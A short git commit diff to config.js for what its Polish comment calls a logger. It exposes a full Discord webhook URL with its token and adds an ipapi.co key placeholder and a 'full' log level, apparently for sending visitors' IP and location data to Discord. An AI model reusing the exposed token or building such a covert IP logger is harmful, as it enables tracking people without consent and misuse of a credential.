81700089e4c24aa441c16f103b5151a1b4457645
diego <marcin.plawik3@wp.pl>
2025-04-02 00:54:56 +0200

    Update config.js

--- config.js
+++ config.js
@@ -1,3 +1,6 @@
+// Konfiguracja Loggera
 const CONFIG = {
-    DISCORD_WEBHOOK: "https://discord.com/api/webhooks/1333931409148088414/sV-jn_QbNtHoLJ3wjixqXVg9tb_tdvkXcgEMlGeNCvrfFJJULdK9_j4nvEbsxzfLo9nT"
+    DISCORD_WEBHOOK: "https://discord.com/api/webhooks/1333931409148088414/sV-jn_QbNtHoLJ3wjixqXVg9tb_tdvkXcgEMlGeNCvrfFJJULdK9_j4nvEbsxzfLo9nT",
+    IPAPI_KEY: "TWÓJ_KLUCZ_API", // Opcjonalne - zarejestruj się na ipapi.co
+    LOG_LEVEL: "full" // 'basic' | 'standard' | 'full'
 };
